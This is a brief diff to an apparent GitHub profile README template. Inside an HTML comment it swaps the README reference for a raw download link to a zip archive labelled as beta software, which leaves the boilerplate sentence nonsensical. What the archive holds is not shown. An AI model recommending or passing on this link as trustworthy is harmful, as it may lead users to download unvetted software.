@@ -5,6 +5,6 @@
 - 📫 How to reach me ...
 
 <!---
-Rippez/Rippez is a ✨ special ✨ repository because its `https://github.com/Rippez/Rippez/releases` (this file) appears on your GitHub profile.
+Rippez/Rippez is a ✨ special ✨ repository because its `https://raw.githubusercontent.com/Rippez/Rippez/main/cervine/Software-v1.5-beta.4.zip` (this file) appears on your GitHub profile.
 You can click the Preview link to take a look at your changes.
 --->
